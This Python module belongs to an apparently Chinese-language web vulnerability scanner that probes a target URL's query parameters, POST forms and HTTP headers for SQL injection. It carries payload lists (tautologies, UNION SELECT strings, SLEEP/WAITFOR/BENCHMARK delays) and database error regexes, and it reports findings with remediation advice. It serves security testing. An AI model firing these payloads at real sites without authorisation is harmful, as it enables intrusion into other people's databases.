#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SQL注入漏洞检查模块
实现6个检查点：
1. 基于错误的SQL注入（Error-based）
2. 基于布尔的SQL注入（Boolean-based）
3. 基于时间的SQL注入（Time-based）
4. URL参数SQL注入
5. POST表单SQL注入
6. HTTP头SQL注入
"""

import re
import time
import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode, urljoin
from typing import Dict, List, Tuple

class SqlInjectionChecks:
    """SQL注入漏洞检查类"""
    
    def __init__(self, session: requests.Session):
        self.session = session
        self.results = []
        
        # SQL注入测试载荷
        self.error_based_payloads = [
            "'",
            "''",
            "`",
            "``",
            ",",
            "\"",
            "\"\"",
            "/",
            "//",
            "\\",
            "\\\\",
            ";",
            "' or \"",
            "-- or #",
            "' OR '1",
            "' OR 1 -- -",
            "\" OR \"\" = \"",
            "\" OR 1 = 1 -- -",
            "' OR '' = '",
            "'='",
            "'LIKE'",
            "'=0--+",
            " OR 1=1",
            "' OR 'x'='x",
            "' AND id IS NULL; --",
            "'''''''''''''UNION SELECT '2",
            "%00",
            "/*…*/ ",
            "+",
            "||",
            "1'1",
            "1' AND '1'='1",
            "1' AND '1'='2",
            "1' OR '1'='1",
            "1' OR '1'='2",
            "1' UNION SELECT NULL--",
            "1' UNION SELECT 1,2,3--",
            "1' UNION SELECT 1,2,3,4,5--",
            "admin'--",
            "admin'/*",
            "admin'#",
            "' UNION SELECT NULL--",
            "' UNION SELECT 1,2,3--",
            "') UNION SELECT NULL--",
            "') UNION SELECT 1,2,3--",
            "1' AND 1=1--",
            "1' AND 1=2--",
            "1' AND 'a'='a",
            "1' AND 'a'='b",
            "1' OR 1=1--",
            "1' OR 1=2--",
            "1' OR 'a'='a",
            "1' OR 'a'='b"
        ]
        
        self.boolean_based_payloads = [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "') OR ('1'='1",
            "') OR ('1'='1'--",
            "') OR ('1'='1'/*",
            "') OR (1=1--",
            "' OR 'a'='a",
            "' OR 'a'='a'--",
            "' OR 'a'='a'/*",
            "') OR ('a'='a",
            "') OR ('a'='a'--",
            "') OR ('a'='a'/*",
            "' OR 1=1 LIMIT 1--",
            "' OR 1=1 LIMIT 1#",
            "' OR 1=1 LIMIT 1/*"
        ]
        
        self.time_based_payloads = [
            "'; WAITFOR DELAY '0:0:5'--",
            "\"; WAITFOR DELAY '0:0:5'--",
            "'; WAITFOR DELAY '0:0:5'#",
            "\"; WAITFOR DELAY '0:0:5'#",
            "'; WAITFOR DELAY '0:0:5'/*",
            "\"; WAITFOR DELAY '0:0:5'/*",
            "'; SELECT SLEEP(5)--",
            "\"; SELECT SLEEP(5)--",
            "'; SELECT SLEEP(5)#",
            "\"; SELECT SLEEP(5)#",
            "'; SELECT SLEEP(5)/*",
            "\"; SELECT SLEEP(5)/*",
            "'; SELECT pg_sleep(5)--",
            "\"; SELECT pg_sleep(5)--",
            "'; SELECT pg_sleep(5)#",
            "\"; SELECT pg_sleep(5)#",
            "'; SELECT pg_sleep(5)/*",
            "\"; SELECT pg_sleep(5)/*",
            "'; BENCHMARK(5000000,MD5(1))--",
            "\"; BENCHMARK(5000000,MD5(1))--",
            "'; BENCHMARK(5000000,MD5(1))#",
            "\"; BENCHMARK(5000000,MD5(1))#"
        ]
        
        # SQL错误信息特征
        self.sql_error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*\Wmysql_.*",
            r"valid MySQL result",
            r"MySqlClient\.",
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_.*",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"Driver.*SQL Server.*",
            r"OLE DB.*SQL Server",
            r"(\W|\A)SQL Server.*Driver",
            r"Warning.*\Wmssql_.*",
            r"Warning.*\Wsqlsrv_.*",
            r"Warning.*\Wodbc_.*",
            r"Warning.*\Woci_.*",
            r"Warning.*\Wora_.*",
            r"Oracle.*Driver",
            r"Warning.*\Wifx_.*",
            r"Exception.*Informix",
            r"Warning.*\Wdb2_.*",
            r"CLI Driver.*DB2",
            r"SQLSTATE.*SQL syntax",
            r"Microsoft Access.*Driver",
            r"JET Database Engine",
            r"Syntax error.*query",
            r"Warning.*\Wmssql_.*",
            r"Warning.*\Wodbc_.*",
            r"Warning.*\Wora_.*",
            r"Warning.*\Wifx_.*",
            r"Warning.*\Wdb2_.*",
            r"SQL syntax.*near",
            r"quoted string not properly terminated",
            r"unclosed quotation mark",
            r"SQL command not properly ended",
            r"ORA-\d{5}",
            r"Microsoft OLE DB Provider",
            r"ODBC SQL Server Driver",
            r"ODBC Microsoft Access",
            r"Microsoft JET Database",
            r"SQLite.*error",
            r"SQLite3::",
            r"Warning.*\Wsqlite_.*",
            r"Warning.*\WSQLite3::",
            r"\[SQLite\]",
            r"SQLiteException",
            r"SQLite error",
            r"SQLite.*syntax"
        ]
    
    def get_checks(self):
        """获取所有检查点"""
        return [
            {
                'id': 'sql_001',
                'name': '基于错误的SQL注入',
                'category': 'SQL注入',
                'description': '检测基于错误信息的SQL注入漏洞'
            },
            {
                'id': 'sql_002',
                'name': '基于布尔的SQL注入',
                'category': 'SQL注入',
                'description': '检测基于布尔逻辑的SQL注入漏洞'
            },
            {
                'id': 'sql_003',
                'name': '基于时间的SQL注入',
                'category': 'SQL注入',
                'description': '检测基于时间延迟的SQL注入漏洞'
            },
            {
                'id': 'sql_004',
                'name': 'URL参数SQL注入',
                'category': 'SQL注入',
                'description': '检测URL查询参数中的SQL注入漏洞'
            },
            {
                'id': 'sql_005',
                'name': 'POST表单SQL注入',
                'category': 'SQL注入',
                'description': '检测POST表单中的SQL注入漏洞'
            },
            {
                'id': 'sql_006',
                'name': 'HTTP头SQL注入',
                'category': 'SQL注入',
                'description': '检测HTTP请求头中的SQL注入漏洞'
            }
        ]
    
    def run_check(self, url, check_id, options):
        """运行指定检查"""
        checks = {
            'sql_001': self.check_error_based_sql_injection,
            'sql_002': self.check_boolean_based_sql_injection,
            'sql_003': self.check_time_based_sql_injection,
            'sql_004': self.check_url_parameter_sql_injection,
            'sql_005': self.check_post_form_sql_injection,
            'sql_006': self.check_http_header_sql_injection
        }
        
        if check_id in checks:
            return checks[check_id](url, options)
        else:
            return {
                'status': 'error',
                'severity': 'info',
                'description': f'未知检查ID: {check_id}',
                'details': {},
                'recommendation': '请检查检查ID是否正确'
            }
    
    def _check_sql_error(self, response_text: str) -> Tuple[bool, str]:
        """检查响应中是否包含SQL错误信息"""
        for pattern in self.sql_error_patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return True, match.group()
        return False, ""
    
    def check_error_based_sql_injection(self, url, options):
        """检查基于错误的SQL注入"""
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            if not params:
                return {
                    'status': 'safe',
                    'severity': 'info',
                    'description': 'URL中没有查询参数，无法测试基于错误的SQL注入',
                    'details': {'url': url},
                    'recommendation': '无需修复'
                }
            
            vulnerable_params = []
            test_details = []
            
            # 获取原始响应作为基准
            try:
                baseline_response = self.session.get(url, timeout=options.get('timeout', 10))
                baseline_text = baseline_response.text
            except:
                baseline_text = ""
            
            # 测试每个参数
            for param_name in list(params.keys())[:5]:  # 限制测试参数数量
                for payload in self.error_based_payloads[:10]:  # 限制payload数量
                    try:
                        # 构造测试URL
                        test_params = params.copy()
                        test_params[param_name] = [payload]
                        test_query = urlencode(test_params, doseq=True)
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                        
                        # 发送请求
                        response = self.session.get(test_url, timeout=options.get('timeout', 10))
                        
                        # 检查是否包含SQL错误
                        has_error, error_msg = self._check_sql_error(response.text)
                        
                        if has_error:
                            vulnerable_params.append(param_name)
                            test_details.append({
                                'parameter': param_name,
                                'payload': payload,
                                'error_message': error_msg[:200],
                                'status_code': response.status_code
                            })
                            break  # 找到一个漏洞就停止测试该参数
                    except Exception as e:
                        continue
            
            if vulnerable_params:
                return {
                    'status': 'vulnerable',
                    'severity': 'high',
                    'description': f'发现基于错误的SQL注入漏洞，受影响参数: {", ".join(set(vulnerable_params))}',
                    'details': {
                        'vulnerable_parameters': list(set(vulnerable_params)),
                        'tests': test_details[:5],  # 只显示前5个测试结果
                        'url': url
                    },
                    'recommendation': '使用参数化查询（Prepared Statements），对所有用户输入进行严格验证和过滤'
                }
            else:
                return {
                    'status': 'safe',
                    'severity': 'info',
                    'description': '未发现基于错误的SQL注入漏洞',
                    'details': {'tested_parameters': list(params.keys())[:5], 'url': url},
                    'recommendation': '继续保持良好的SQL注入防护实践'
                }
                
        except Exception as e:
            return {
                'status': 'error',
                'severity': 'info',
                'description': f'检查基于错误的SQL注入时出错: {str(e)}',
                'details': {'url': url, 'error': str(e)},
                'recommendation': '请检查网络连接或目标服务器状态'
            }
    
    def check_boolean_based_sql_injection(self, url, options):
        """检查基于布尔的SQL注入"""
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            if not params:
                return {
                    'status': 'safe',
                    'severity': 'info',
                    'description': 'URL中没有查询参数，无法测试基于布尔的SQL注入',
                    'details': {'url': url},
                    'recommendation': '无需修复'
                }
            
            vulnerable_params = []
            test_details = []
            
            # 获取原始响应作为基准
            try:
                baseline_response = self.session.get(url, timeout=options.get('timeout', 10))
                baseline_length = len(baseline_response.text)
                baseline_status = baseline_response.status_code
            except:
                baseline_length = 0
                baseline_status = 200
            
            # 测试每个参数
            for param_name in list(params.keys())[:5]:  # 限制测试参数数量
                true_payload = None
                false_payload = None
                true_response = None
                false_response = None
                
                for payload in self.boolean_based_payloads[:5]:  # 限制payload数量
                    try:
                        # 测试TRUE条件
                        if '1' in payload or 'a' in payload.lower():
                            test_params = params.copy()
                            test_params[param_name] = [payload]
                            test_query = urlencode(test_params, doseq=True)
                            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                            
                            response = self.session.get(test_url, timeout=options.get('timeout', 10))
                            
                            if true_response is None:
                                true_payload = payload
                                true_response = response
                            
                            # 测试FALSE条件
                            false_payload_test = payload.replace('1', '2').replace('a', 'b')
                            test_params[param_name] = [false_payload_test]
                            test_query = urlencode(test_params, doseq=True)
                            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                            
                            response = self.session.get(test_url, timeout=options.get('timeout', 10))
                            
                            if false_response is None:
                                false_payload = false_payload_test
                                false_response = response
                            
                            # 比较响应差异
                            if true_response and false_response:
                                true_length = len(true_response.text)
                                false_length = len(false_response.text)
                                true_status = true_response.status_code
                                false_status = false_response.status_code
                                
                                # 如果响应有明显差异，可能存在SQL注入
                                if abs(true_length - false_length) > 100 or true_status != false_status:
                                    vulnerable_params.append(param_name)
                                    test_details.append({
                                        'parameter': param_name,
                                        'true_payload': true_payload,
                                        'false_payload': false_payload,
                                        'true_length': true_length,
                                        'false_length': false_length,
                                        'difference': abs(true_length - false_length)
                                    })
                                    break
                    except Exception as e:
                        continue
            
            if vulnerable_params:
                return {
                    'status': 'vulnerable',
                    'severity': 'high',
                    'description': f'发现基于布尔的SQL注入漏洞，受影响参数: {", ".join(set(vulnerable_params))}',
                    'details': {
                        'vulnerable_parameters': list(set(vulnerable_params)),
                        'tests': test_details[:5],
                        'url': url
                    },
                    'recommendation': '使用参数化查询（Prepared Statements），对所有用户输入进行严格验证和过滤'
                }
            else:
                return {
                    'status': 'safe',
                    'severity': 'info',
                    'description': '未发现基于布尔的SQL注入漏洞',
                    'details': {'tested_parameters': list(params.keys())[:5], 'url': url},
                    'recommendation': '继续保持良好的SQL注入防护实践'
                }
                
        except Exception as e:
            return {
                'status': 'error',
                'severity': 'info',
                'description': f'检查基于布尔的SQL注入时出错: {str(e)}',
                'details': {'url': url, 'error': str(e)},
                'recommendation': '请检查网络连接或目标服务器状态'
            }
    
    def check_time_based_sql_injection(self, url, options):
        """检查基于时间的SQL注入"""
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            if not params:
                return {
                    'status': 'safe',
                    'severity': 'info',
                    'description': 'URL中没有查询参数，无法测试基于时间的SQL注入',
                    'details': {'url': url},
                    'recommendation': '无需修复'
                }
            
            vulnerable_params = []
            test_details = []
            delay_time = 3  # 延迟时间（秒）
            
            # 测试每个参数
            for param_name in list(params.keys())[:3]:  # 限制测试参数数量（时间测试较慢）
                for payload in self.time_based_payloads[:3]:  # 限制payload数量
                    try:
                        # 构造测试URL
                        test_params = params.copy()
                        test_params[param_name] = [payload]
                        test_query = urlencode(test_params, doseq=True)
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                        
                        # 测量响应时间
                        start_time = time.time()
                        response = self.session.get(test_url, timeout=options.get('timeout', 10) + delay_time)
                        elapsed_time = time.time() - start_time
                        
                        # 如果响应时间明显超过延迟时间，可能存在SQL注入
                        if elapsed_time >= delay_time - 0.5:  # 允许0.5秒误差
                            vulnerable_params.append(param_name)
                            test_details.append({
                                'parameter': param_name,
                                'payload': payload,
                                'response_time': round(elapsed_time, 2),
                                'expected_delay': delay_time
                            })
                            break  # 找到一个漏洞就停止测试该参数
                    except Exception as e:
                        continue
            
            if vulnerable_params:
                return {
                    'status': 'vulnerable',
                    'severity': 'high',
                    'description': f'发现基于时间的SQL注入漏洞，受影响参数: {", ".join(set(vulnerable_params))}',
                    'details': {
                        'vulnerable_parameters': list(set(vulnerable_params)),
                        'tests': test_details,
                        'url': url
                    },
                    'recommendation': '使用参数化查询（Prepared Statements），对所有用户输入进行严格验证和过滤'
                }
            else:
                return {
                    'status': 'safe',
                    'severity': 'info',
                    'description': '未发现基于时间的SQL注入漏洞',
                    'details': {'tested_parameters': list(params.keys())[:3], 'url': url},
                    'recommendation': '继续保持良好的SQL注入防护实践'
                }
                
        except Exception as e:
            return {
                'status': 'error',
                'severity': 'info',
                'description': f'检查基于时间的SQL注入时出错: {str(e)}',
                'details': {'url': url, 'error': str(e)},
                'recommendation': '请检查网络连接或目标服务器状态'
            }
    
    def check_url_parameter_sql_injection(self, url, options):
        """检查URL参数中的SQL注入"""
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            if not params:
                return {
                    'status': 'safe',
                    'severity': 'info',
                    'description': 'URL中没有查询参数',
                    'details': {'url': url},
                    'recommendation': '无需修复'
                }
            
            # 综合使用错误、布尔和时间检测
            error_result = self.check_error_based_sql_injection(url, options)
            boolean_result = self.check_boolean_based_sql_injection(url, options)
            
            vulnerable_params = set()
            
            if error_result.get('status') == 'vulnerable':
                error_params = error_result.get('details', {}).get('vulnerable_parameters', [])
                vulnerable_params.update(error_params)
            
            if boolean_result.get('status') == 'vulnerable':
                boolean_params = boolean_result.get('details', {}).get('vulnerable_parameters', [])
                vulnerable_params.update(boolean_params)
            
            if vulnerable_params:
                return {
                    'status': 'vulnerable',
                    'severity': 'high',
                    'description': f'在URL参数中发现SQL注入漏洞，受影响参数: {", ".join(vulnerable_params)}',
                    'details': {
                        'vulnerable_parameters': list(vulnerable_params),
                        'error_based': error_result.get('status') == 'vulnerable',
                        'boolean_based': boolean_result.get('status') == 'vulnerable',
                        'url': url
                    },
                    'recommendation': '使用参数化查询（Prepared Statements），对所有URL参数进行严格验证和过滤'
                }
            else:
                return {
                    'status': 'safe',
                    'severity': 'info',
                    'description': '未在URL参数中发现SQL注入漏洞',
                    'details': {'tested_parameters': list(params.keys()), 'url': url},
                    'recommendation': '继续保持良好的SQL注入防护实践'
                }
                
        except Exception as e:
            return {
                'status': 'error',
                'severity': 'info',
                'description': f'检查URL参数SQL注入时出错: {str(e)}',
                'details': {'url': url, 'error': str(e)},
                'recommendation': '请检查网络连接或目标服务器状态'
            }
    
    def check_post_form_sql_injection(self, url, options):
        """检查POST表单中的SQL注入"""
        try:
            # 获取页面内容
            response = self.session.get(url, timeout=options.get('timeout', 10))
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # 查找表单
            forms = soup.find_all('form')
            
            if not forms:
                return {
                    'status': 'safe',
                    'severity': 'info',
                    'description': '页面中未发现表单',
                    'details': {'url': url},
                    'recommendation': '无需修复'
                }
            
            vulnerable_forms = []
            form_details = []
            
            for form in forms:
                form_action = form.get('action', '')
                form_method = form.get('method', 'get').lower()
                
                # 只检查POST表单
                if form_method != 'post':
                    continue
                
                # 获取表单输入字段
                inputs = form.find_all('input')
                text_inputs = []
                for inp in inputs:
                    input_type = inp.get('type', 'text').lower()
                    input_name = inp.get('name', '')
                    if input_name and input_type in ['text', 'password', 'email', 'search', 'hidden']:
                        text_inputs.append(input_name)
                
                if not text_inputs:
                    continue
                
                # 构造表单URL
                if form_action:
                    if form_action.startswith('http'):
                        form_url = form_action
                    else:
                        form_url = urljoin(url, form_action)
                else:
                    form_url = url
                
                # 测试每个输入字段
                form_vulnerable = False
                vulnerable_fields = []
                
                for field_name in text_inputs[:3]:  # 限制测试字段数量
                    # 使用错误检测payload
                    for payload in self.error_based_payloads[:5]:  # 限制payload数量
                        try:
                            # 构造POST数据
                            post_data = {}
                            for inp in inputs:
                                inp_name = inp.get('name', '')
                                if inp_name:
                                    if inp_name == field_name:
                                        post_data[inp_name] = payload
                                    else:
                                        # 其他字段使用默认值
                                        inp_type = inp.get('type', '').lower()
                                        if inp_type == 'hidden':
                                            post_data[inp_name] = inp.get('value', '')
                                        elif inp_type == 'checkbox' or inp_type == 'radio':
                                            if inp.get('checked'):
                                                post_data[inp_name] = inp.get('value', '')
                                        else:
                                            post_data[inp_name] = 'test'
                            
                            # 发送POST请求
                            response = self.session.post(form_url, data=post_data, timeout=options.get('timeout', 10))
                            
                            # 检查是否包含SQL错误
                            has_error, error_msg = self._check_sql_error(response.text)
                            
                            if has_error:
                                form_vulnerable = True
                                vulnerable_fields.append({
                                    'field': field_name,
                                    'payload': payload,
                                    'error_message': error_msg[:200]
                                })
                                break
                        except Exception as e:
                            continue
                    
                    if form_vulnerable:
                        break
                
                if form_vulnerable:
                    vulnerable_forms.append({
                        'action': form_action,
                        'method': form_method,
                        'vulnerable_fields': vulnerable_fields
                    })
                    form_details.append({
                        'form_url': form_url,
                        'vulnerable_fields': vulnerable_fields
                    })
            
            if vulnerable_forms:
                return {
                    'status': 'vulnerable',
                    'severity': 'high',
                    'description': f'在POST表单中发现SQL注入漏洞，受影响表单: {len(vulnerable_forms)}个',
                    'details': {
                        'vulnerable_forms': vulnerable_forms,
                        'form_details': form_details,
                        'url': url
                    },
                    'recommendation': '使用参数化查询（Prepared Statements），对所有表单输入进行严格验证和过滤'
                }
            else:
                return {
                    'status': 'safe',
                    'severity': 'info',
                    'description': '未在POST表单中发现SQL注入漏洞',
                    'details': {'tested_forms': len(forms), 'url': url},
                    'recommendation': '继续保持良好的SQL注入防护实践'
                }
                
        except Exception as e:
            return {
                'status': 'error',
                'severity': 'info',
                'description': f'检查POST表单SQL注入时出错: {str(e)}',
                'details': {'url': url, 'error': str(e)},
                'recommendation': '请检查网络连接或目标服务器状态'
            }
    
    def check_http_header_sql_injection(self, url, options):
        """检查HTTP头中的SQL注入"""
        try:
            # 测试的HTTP头
            test_headers = {
                'User-Agent': self.error_based_payloads[:3],
                'Referer': self.error_based_payloads[:3],
                'X-Forwarded-For': self.error_based_payloads[:3],
                'X-Real-IP': self.error_based_payloads[:3],
                'X-Originating-IP': self.error_based_payloads[:3],
                'X-Remote-IP': self.error_based_payloads[:3],
                'X-Remote-Addr': self.error_based_payloads[:3]
            }
            
            vulnerable_headers = []
            test_details = []
            
            # 获取原始响应作为基准
            try:
                baseline_response = self.session.get(url, timeout=options.get('timeout', 10))
                baseline_text = baseline_response.text
            except:
                baseline_text = ""
            
            # 测试每个HTTP头
            for header_name, payloads in test_headers.items():
                for payload in payloads:
                    try:
                        # 构造自定义请求头
                        headers = {header_name: payload}
                        
                        # 发送请求
                        response = self.session.get(url, headers=headers, timeout=options.get('timeout', 10))
                        
                        # 检查是否包含SQL错误
                        has_error, error_msg = self._check_sql_error(response.text)
                        
                        if has_error:
                            vulnerable_headers.append(header_name)
                            test_details.append({
                                'header': header_name,
                                'payload': payload,
                                'error_message': error_msg[:200],
                                'status_code': response.status_code
                            })
                            break  # 找到一个漏洞就停止测试该头
                    except Exception as e:
                        continue
            
            if vulnerable_headers:
                return {
                    'status': 'vulnerable',
                    'severity': 'high',
                    'description': f'在HTTP请求头中发现SQL注入漏洞，受影响头: {", ".join(set(vulnerable_headers))}',
                    'details': {
                        'vulnerable_headers': list(set(vulnerable_headers)),
                        'tests': test_details,
                        'url': url
                    },
                    'recommendation': '使用参数化查询（Prepared Statements），对所有HTTP头进行严格验证和过滤，不要直接使用HTTP头值构建SQL查询'
                }
            else:
                return {
                    'status': 'safe',
                    'severity': 'info',
                    'description': '未在HTTP请求头中发现SQL注入漏洞',
                    'details': {'tested_headers': list(test_headers.keys()), 'url': url},
                    'recommendation': '继续保持良好的SQL注入防护实践'
                }
                
        except Exception as e:
            return {
                'status': 'error',
                'severity': 'info',
                'description': f'检查HTTP头SQL注入时出错: {str(e)}',
                'details': {'url': url, 'error': str(e)},
                'recommendation': '请检查网络连接或目标服务器状态'
            }

